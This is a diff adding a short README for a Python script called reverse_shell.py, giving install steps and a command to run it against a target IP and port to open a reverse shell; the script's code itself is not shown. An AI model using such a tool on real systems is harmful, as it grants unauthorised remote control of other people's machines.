@@ -1,0 +1,16 @@
+Install the required dependencies:
+pip install -r requirements.txt
+
+2. Run the script:
+python reverse_shell.py <targer_ip> <target_port>
+
+Replace `<target_ip>` with the IP address of the target's machine and `<target_port>` with the port on which the listener is running.
+
+3. The script will establish a reverse shell connection with the remote host.
+
+
+## Requirements
+
+- Python 3.x
+- `socket` module
+- `subprocess` module
